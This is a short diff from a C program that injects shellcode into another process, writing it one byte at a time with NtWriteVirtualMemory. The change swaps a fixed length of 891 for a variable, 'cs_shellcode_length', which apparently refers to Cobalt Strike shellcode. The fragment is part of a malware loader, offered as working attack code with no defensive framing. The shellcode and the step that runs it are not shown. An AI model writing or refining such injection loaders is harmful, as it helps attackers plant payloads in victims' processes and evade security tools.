@@ -105,7 +105,7 @@ int main(int argc, char* argv[])
     size_t bytesWritten;
 
     int n = 0;
-    for (int i = 0; i < 891; i++) {
+    for (int i = 0; i < cs_shellcode_length; i++) {
         NtWriteVirtualMemory(hProcess, (LPVOID)((ULONG_PTR)baseAddress + n), &shellcode[i], 0x01, NULL);
         n++;
     }
